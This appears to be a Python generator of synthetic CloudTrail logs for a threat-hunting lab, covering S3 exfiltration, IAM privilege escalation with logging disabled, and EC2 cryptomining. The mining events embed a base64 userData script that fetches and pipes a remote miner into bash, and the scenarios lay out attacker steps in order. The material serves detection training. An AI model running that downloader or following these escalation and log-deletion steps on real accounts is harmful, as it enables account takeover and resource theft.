#!/usr/bin/env python3
"""
Generates three CloudTrail attack-scenario NDJSON files for Hunt Lab.
Each event uses TIMESTAMP_PLACEHOLDER which load_cloud_scenarios.sh replaces
with real timestamps staggered 15 seconds apart.
"""
import json, os

ACCT = "000000000000"
REGION = "us-east-1"

def ev(event_name, event_source, user_name, source_ip, user_type="IAMUser",
       request_params=None, response_elems=None, read_only=True,
       error_code=None, error_message=None, event_id_hint=""):
    """Build a minimal but realistic CloudTrail event dict."""
    import hashlib
    uid = hashlib.md5(f"{event_name}{user_name}{event_id_hint}".encode()).hexdigest()
    obj = {
        "eventVersion": "1.08",
        "userIdentity": {
            "type": user_type,
            "principalId": f"AIDA{uid[:16].upper()}",
            "arn": f"arn:aws:iam::{ACCT}:user/{user_name}",
            "accountId": ACCT,
            "userName": user_name,
        },
        "eventTime": "TIMESTAMP_PLACEHOLDER",
        "@timestamp": "TIMESTAMP_PLACEHOLDER",
        "eventSource": event_source,
        "eventName": event_name,
        "awsRegion": REGION,
        "sourceIPAddress": source_ip,
        "userAgent": "aws-cli/2.13.0 Python/3.11.6 Linux/5.15.0-generic",
        "requestParameters": request_params,
        "responseElements": response_elems,
        "requestID": f"req-{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}",
        "eventID": f"evt-{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}",
        "readOnly": read_only,
        "eventType": "AwsApiCall",
        "managementEvent": True,
        "recipientAccountId": ACCT,
    }
    if error_code:
        obj["errorCode"] = error_code
    if error_message:
        obj["errorMessage"] = error_message
    return obj


def write_ndjson(path, events):
    with open(path, "w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e, separators=(",", ":")) + "\n")
    print(f"  Wrote {len(events)} events -> {path}")


SCENARIOS_DIR = os.path.dirname(os.path.abspath(__file__))

# ── Scenario 1: S3 Data Exfiltration ─────────────────────────────────────────
# ATT&CK: T1526 (Cloud Service Discovery), T1537 (Transfer Data to Cloud Account)
# Actor: compromised analyst-readonly credential from Tor exit node
ATTACKER_IP_S3 = "185.220.101.50"
USER_S3 = "analyst-readonly"

s3_events = [
    # Phase 1 — Discovery
    ev("GetCallerIdentity", "sts.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params=None, response_elems={"userId": f"AIDA{ACCT[:16]}", "account": ACCT, "arn": f"arn:aws:iam::{ACCT}:user/{USER_S3}"},
       read_only=True, event_id_hint="s3-01"),
    ev("ListBuckets", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params=None, response_elems=None, read_only=True, event_id_hint="s3-02"),
    ev("GetBucketAcl", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials"}, response_elems=None,
       read_only=True, event_id_hint="s3-03"),
    ev("GetBucketAcl", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data"}, response_elems=None,
       read_only=True, event_id_hint="s3-04"),
    ev("GetBucketLogging", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data"}, response_elems=None,
       read_only=True, event_id_hint="s3-05"),
    ev("GetBucketVersioning", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials"}, response_elems=None,
       read_only=True, event_id_hint="s3-06"),
    ev("GetBucketPolicy", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data"}, response_elems=None,
       read_only=True, event_id_hint="s3-07"),
    # Phase 2 — Data Access
    ev("ListObjectsV2", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "prefix": "", "encodingType": "url"},
       response_elems=None, read_only=True, event_id_hint="s3-08"),
    ev("ListObjectsV2", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials", "prefix": "", "encodingType": "url"},
       response_elems=None, read_only=True, event_id_hint="s3-09"),
    ev("HeadObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "key": "employees/john_doe.json"},
       response_elems=None, read_only=True, event_id_hint="s3-10"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "key": "employees/john_doe.json"},
       response_elems=None, read_only=True, event_id_hint="s3-11"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "key": "employees/jane_smith.json"},
       response_elems=None, read_only=True, event_id_hint="s3-12"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials", "key": "2025-q4-report.json"},
       response_elems=None, read_only=True, event_id_hint="s3-13"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials", "key": "2025-q4-report.json"},
       response_elems=None, read_only=True, event_id_hint="s3-13b"),
    ev("ListObjectsV2", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "prefix": "payroll/", "encodingType": "url"},
       response_elems=None, read_only=True, event_id_hint="s3-14"),
    # Phase 3 — Staging bucket creation
    ev("CreateBucket", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "CreateBucketConfiguration": {"LocationConstraint": REGION}},
       response_elems={"location": "http://exfil-staging-8f3a2b.s3.amazonaws.com/"},
       read_only=False, event_id_hint="s3-15"),
    ev("PutBucketAcl", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "acl": "public-read"},
       response_elems=None, read_only=False, event_id_hint="s3-16"),
    ev("PutObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "key": "dump/hr_employees.json",
                       "x-amz-server-side-encryption": "None"},
       response_elems={"x-amz-server-side-encryption": "None"},
       read_only=False, event_id_hint="s3-17"),
    ev("PutObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "key": "dump/financials_q4.json",
                       "x-amz-server-side-encryption": "None"},
       response_elems={"x-amz-server-side-encryption": "None"},
       read_only=False, event_id_hint="s3-18"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "key": "dump/hr_employees.json"},
       response_elems=None, read_only=True, event_id_hint="s3-19"),
    # Phase 4 — Cover tracks
    ev("DeleteObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "key": "dump/hr_employees.json"},
       response_elems=None, read_only=False, event_id_hint="s3-20"),
    ev("DeleteObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b", "key": "dump/financials_q4.json"},
       response_elems=None, read_only=False, event_id_hint="s3-21"),
    ev("DeleteBucket", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "exfil-staging-8f3a2b"},
       response_elems=None, read_only=False, event_id_hint="s3-22"),
    ev("GetBucketLogging", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "company-financials"}, response_elems=None,
       read_only=True, event_id_hint="s3-23"),
    ev("ListObjectsV2", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "prefix": "payroll/archive/", "encodingType": "url"},
       response_elems=None, read_only=True, event_id_hint="s3-24"),
    ev("GetObject", "s3.amazonaws.com", USER_S3, ATTACKER_IP_S3,
       request_params={"bucketName": "hr-data", "key": "employees/john_doe.json"},
       response_elems=None, read_only=True, event_id_hint="s3-25"),
]

write_ndjson(os.path.join(SCENARIOS_DIR, "s3_exfiltration.ndjson"), s3_events)


# ── Scenario 2: IAM Privilege Escalation ──────────────────────────────────────
# ATT&CK: T1087.004 (Account Discovery: Cloud Account),
#         T1078.004 (Valid Accounts: Cloud Accounts),
#         T1136.003 (Create Account: Cloud Account),
#         T1562.001 (Impair Defenses: Disable or Modify Tools)
ATTACKER_IP_IAM = "203.0.113.45"
USER_IAM = "analyst-readonly"
USER_IAM2 = "dev-ops"

iam_events = [
    # Phase 1 — Reconnaissance (as analyst-readonly from attacker IP)
    ev("GetCallerIdentity", "sts.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params=None,
       response_elems={"userId": f"AIDAANALYST0000001", "account": ACCT,
                       "arn": f"arn:aws:iam::{ACCT}:user/{USER_IAM}"},
       read_only=True, event_id_hint="iam-01"),
    ev("ListUsers", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={}, response_elems=None, read_only=True, event_id_hint="iam-02"),
    ev("ListAttachedUserPolicies", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM}, response_elems=None,
       read_only=True, event_id_hint="iam-03"),
    ev("ListAttachedUserPolicies", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM2}, response_elems=None,
       read_only=True, event_id_hint="iam-04"),
    ev("GetUser", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM2}, response_elems=None,
       read_only=True, event_id_hint="iam-05"),
    ev("ListPolicies", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={"scope": "All"}, response_elems=None,
       read_only=True, event_id_hint="iam-06"),
    ev("GetPolicy", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={"policyArn": "arn:aws:iam::aws:policy/IAMFullAccess"},
       response_elems=None, read_only=True, event_id_hint="iam-07"),
    ev("ListRoles", "iam.amazonaws.com", USER_IAM, ATTACKER_IP_IAM,
       request_params={}, response_elems=None, read_only=True, event_id_hint="iam-08"),
    # Phase 2 — Privilege escalation (using dev-ops IAMFullAccess)
    ev("CreateUser", "iam.amazonaws.com", USER_IAM2, ATTACKER_IP_IAM,
       request_params={"userName": "svc-backup-restore"},
       response_elems={"user": {"userName": "svc-backup-restore",
                                "arn": f"arn:aws:iam::{ACCT}:user/svc-backup-restore",
                                "createDate": "TIMESTAMP_PLACEHOLDER"}},
       read_only=False, event_id_hint="iam-09"),
    ev("CreateAccessKey", "iam.amazonaws.com", USER_IAM2, ATTACKER_IP_IAM,
       request_params={"userName": "svc-backup-restore"},
       response_elems={"accessKey": {"userName": "svc-backup-restore",
                                     "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
                                     "status": "Active",
                                     "secretAccessKey": "HIDDEN"}},
       read_only=False, event_id_hint="iam-10"),
    ev("AttachUserPolicy", "iam.amazonaws.com", USER_IAM2, ATTACKER_IP_IAM,
       request_params={"userName": "svc-backup-restore",
                       "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
       response_elems=None, read_only=False, event_id_hint="iam-11"),
    ev("CreateLoginProfile", "iam.amazonaws.com", USER_IAM2, ATTACKER_IP_IAM,
       request_params={"userName": "svc-backup-restore", "passwordResetRequired": False},
       response_elems={"loginProfile": {"userName": "svc-backup-restore",
                                        "createDate": "TIMESTAMP_PLACEHOLDER",
                                        "passwordResetRequired": False}},
       read_only=False, event_id_hint="iam-12"),
    # Phase 3 — Verify escalation (now as svc-backup-restore)
    ev("GetCallerIdentity", "sts.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params=None,
       response_elems={"userId": "AIDAEXAMPLEBACKUP001", "account": ACCT,
                       "arn": f"arn:aws:iam::{ACCT}:user/svc-backup-restore"},
       read_only=True, event_id_hint="iam-13"),
    # Phase 4 — Impair defenses: disable CloudTrail (T1562.001)
    ev("StopLogging", "cloudtrail.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"name": "hunt-lab-trail"}, response_elems=None,
       read_only=False, event_id_hint="iam-14"),
    ev("GetTrailStatus", "cloudtrail.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"name": "hunt-lab-trail"}, response_elems=None,
       read_only=True, event_id_hint="iam-15"),
    ev("PutEventSelectors", "cloudtrail.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"trailName": "hunt-lab-trail",
                       "eventSelectors": [{"readWriteType": "None",
                                           "includeManagementEvents": False}]},
       response_elems=None, read_only=False, event_id_hint="iam-16"),
    ev("DeleteTrail", "cloudtrail.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"name": "hunt-lab-trail"}, response_elems=None,
       read_only=False, event_id_hint="iam-17"),
    # Phase 5 — Persistence
    ev("CreateGroup", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"groupName": "cloud-admins-backup"},
       response_elems={"group": {"groupName": "cloud-admins-backup",
                                 "arn": f"arn:aws:iam::{ACCT}:group/cloud-admins-backup"}},
       read_only=False, event_id_hint="iam-18"),
    ev("AddUserToGroup", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"groupName": "cloud-admins-backup", "userName": "svc-backup-restore"},
       response_elems=None, read_only=False, event_id_hint="iam-19"),
    ev("AttachGroupPolicy", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"groupName": "cloud-admins-backup",
                       "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"},
       response_elems=None, read_only=False, event_id_hint="iam-20"),
    ev("CreateVirtualMFADevice", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"virtualMFADeviceName": "svc-backup-restore-mfa"},
       response_elems={"virtualMFADevice": {
           "serialNumber": f"arn:aws:iam::{ACCT}:mfa/svc-backup-restore-mfa"}},
       read_only=False, event_id_hint="iam-21"),
    # Phase 6 — Lateral movement: compromise original user
    ev("ListAccessKeys", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM}, response_elems=None,
       read_only=True, event_id_hint="iam-22"),
    ev("UpdateAccessKey", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM, "accessKeyId": "AKIAEXAMPLEANALYST1",
                       "status": "Inactive"},
       response_elems=None, read_only=False, event_id_hint="iam-23"),
    ev("CreateAccessKey", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"userName": USER_IAM},
       response_elems={"accessKey": {"userName": USER_IAM,
                                     "accessKeyId": "AKIANEWEXAMPLE00002",
                                     "status": "Active", "secretAccessKey": "HIDDEN"}},
       read_only=False, event_id_hint="iam-24"),
    ev("TagUser", "iam.amazonaws.com", "svc-backup-restore", ATTACKER_IP_IAM,
       request_params={"userName": "svc-backup-restore",
                       "tags": [{"key": "ManagedBy", "value": "terraform"},
                                 {"key": "Environment", "value": "production"}]},
       response_elems=None, read_only=False, event_id_hint="iam-25"),
]

write_ndjson(os.path.join(SCENARIOS_DIR, "iam_privesc.ndjson"), iam_events)


# ── Scenario 3: Crypto Mining via Cloud Compute ───────────────────────────────
# ATT&CK: T1496.001 (Resource Hijacking: Compute Hijacking),
#         T1070.004 (Indicator Removal: File Deletion),
#         T1562.001 (Impair Defenses)
ATTACKER_IP_CRYPTO = "45.155.205.233"
USER_CRYPTO = "dev-ops"

crypto_events = [
    # Phase 1 — Reconnaissance
    ev("GetCallerIdentity", "sts.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params=None,
       response_elems={"userId": "AIDADEVOPS0000001", "account": ACCT,
                       "arn": f"arn:aws:iam::{ACCT}:user/{USER_CRYPTO}"},
       read_only=True, event_id_hint="cm-01"),
    ev("DescribeRegions", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filtersSet": {}}, response_elems=None,
       read_only=True, event_id_hint="cm-02"),
    ev("DescribeAvailabilityZones", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={}, response_elems=None, read_only=True, event_id_hint="cm-03"),
    ev("DescribeInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filterSet": {}, "instancesSet": {}},
       response_elems=None, read_only=True, event_id_hint="cm-04"),
    ev("GetAccountSummary", "iam.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={}, response_elems=None, read_only=True, event_id_hint="cm-05"),
    ev("DescribeInstanceTypeOfferings", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"locationType": "region"}, response_elems=None,
       read_only=True, event_id_hint="cm-06"),
    # Phase 2 — Infrastructure setup
    ev("CreateKeyPair", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"keyName": "mining-ops-key"},
       response_elems={"keyName": "mining-ops-key",
                       "keyFingerprint": "aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99",
                       "keyMaterial": "HIDDEN"},
       read_only=False, event_id_hint="cm-07"),
    ev("DescribeSecurityGroups", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filterSet": {}}, response_elems=None,
       read_only=True, event_id_hint="cm-08"),
    ev("CreateSecurityGroup", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"groupName": "mining-sg", "groupDescription": "Internal automation",
                       "vpcId": "vpc-00000000"},
       response_elems={"groupId": "sg-0a1b2c3d4e5f60001"},
       read_only=False, event_id_hint="cm-09"),
    ev("AuthorizeSecurityGroupEgress", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"groupId": "sg-0a1b2c3d4e5f60001",
                       "ipPermissions": [{"ipProtocol": "-1", "fromPort": -1, "toPort": -1,
                                          "ipRanges": [{"cidrIp": "0.0.0.0/0"}]}]},
       response_elems=None, read_only=False, event_id_hint="cm-10"),
    # Phase 3 — Launch mining fleet
    ev("RunInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"instanceType": "t3.xlarge", "minCount": 1, "maxCount": 1,
                       "keyName": "mining-ops-key", "securityGroupSet": [{"groupId": "sg-0a1b2c3d4e5f60001"}],
                       "imageId": "ami-0123456789abcdef0",
                       "userData": "IyEvYmluL2Jhc2gKY3VybCAtc0wgaHR0cDovL3Bvb2wubWluZXhoci5jb20vbWluZXIgfCBiYXNoCg=="},
       response_elems={"instancesSet": {"items": [{"instanceId": "i-0001a2b3c4d5e6f70",
                                                    "instanceType": "t3.xlarge",
                                                    "currentState": {"name": "pending"}}]}},
       read_only=False, event_id_hint="cm-11"),
    ev("RunInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"instanceType": "c5.4xlarge", "minCount": 5, "maxCount": 5,
                       "keyName": "mining-ops-key", "securityGroupSet": [{"groupId": "sg-0a1b2c3d4e5f60001"}],
                       "imageId": "ami-0123456789abcdef0",
                       "userData": "IyEvYmluL2Jhc2gKY3VybCAtc0wgaHR0cDovL3Bvb2wubWluZXhoci5jb20vbWluZXIgfCBiYXNoCg=="},
       response_elems={"instancesSet": {"items": [
           {"instanceId": f"i-000{i}a2b3c4d5e6f71", "instanceType": "c5.4xlarge",
            "currentState": {"name": "pending"}} for i in range(5)]}},
       read_only=False, event_id_hint="cm-12"),
    ev("RunInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"instanceType": "m5.8xlarge", "minCount": 10, "maxCount": 10,
                       "keyName": "mining-ops-key", "securityGroupSet": [{"groupId": "sg-0a1b2c3d4e5f60001"}],
                       "imageId": "ami-0123456789abcdef0"},
       response_elems={"instancesSet": {"items": [
           {"instanceId": f"i-000{i}a2b3c4d5e6f72", "instanceType": "m5.8xlarge",
            "currentState": {"name": "pending"}} for i in range(10)]}},
       read_only=False, event_id_hint="cm-13"),
    ev("CreateTags", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"resourcesSet": {"items": [{"resourceId": "i-0001a2b3c4d5e6f70"}]},
                       "tagSet": {"items": [{"key": "Name", "value": "batch-worker"},
                                            {"key": "Project", "value": "ml-training"}]}},
       response_elems=None, read_only=False, event_id_hint="cm-14"),
    ev("DescribeInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filterSet": {"items": [{"name": "instance-state-name",
                                                "valueSet": {"items": [{"value": "running"}]}}]}},
       response_elems=None, read_only=True, event_id_hint="cm-15"),
    ev("DescribeSpotPriceHistory", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"instanceTypeSet": {"items": [{"instanceType": "c5.4xlarge"}]},
                       "productDescriptionSet": {"items": [{"productDescription": "Linux/UNIX"}]}},
       response_elems=None, read_only=True, event_id_hint="cm-16"),
    ev("RequestSpotInstances", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"spotPrice": "0.50", "instanceCount": 20,
                       "launchSpecification": {"instanceType": "c5.4xlarge",
                                               "imageId": "ami-0123456789abcdef0",
                                               "keyName": "mining-ops-key"}},
       response_elems=None, read_only=False, event_id_hint="cm-17"),
    # Phase 4 — Cover tracks (T1070.004, T1562.001)
    ev("StopLogging", "cloudtrail.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"name": "hunt-lab-trail"}, response_elems=None,
       read_only=False, event_id_hint="cm-18"),
    ev("DeleteTrail", "cloudtrail.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"name": "hunt-lab-trail"}, response_elems=None,
       read_only=False, event_id_hint="cm-19"),
    ev("PutBucketVersioning", "s3.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"bucketName": "cloudtrail-logs",
                       "VersioningConfiguration": {"Status": "Suspended"}},
       response_elems=None, read_only=False, event_id_hint="cm-20"),
    ev("DeleteBucket", "s3.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"bucketName": "cloudtrail-logs"},
       response_elems=None, read_only=False, event_id_hint="cm-21"),
    ev("ModifyInstanceAttribute", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"instanceId": "i-0001a2b3c4d5e6f70",
                       "disableApiTermination": {"value": True}},
       response_elems=None, read_only=False, event_id_hint="cm-22"),
    ev("DescribeInstanceStatus", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filterSet": {}}, response_elems=None,
       read_only=True, event_id_hint="cm-23"),
    ev("DescribeVpcs", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"filterSet": {}}, response_elems=None,
       read_only=True, event_id_hint="cm-24"),
    ev("CreateVpc", "ec2.amazonaws.com", USER_CRYPTO, ATTACKER_IP_CRYPTO,
       request_params={"cidrBlock": "10.200.0.0/16", "amazonProvidedIpv6CidrBlock": False},
       response_elems={"vpc": {"vpcId": "vpc-0mining000001",
                               "state": "pending", "cidrBlock": "10.200.0.0/16"}},
       read_only=False, event_id_hint="cm-25"),
]

write_ndjson(os.path.join(SCENARIOS_DIR, "crypto_mining.ndjson"), crypto_events)

print("All scenario files generated.")
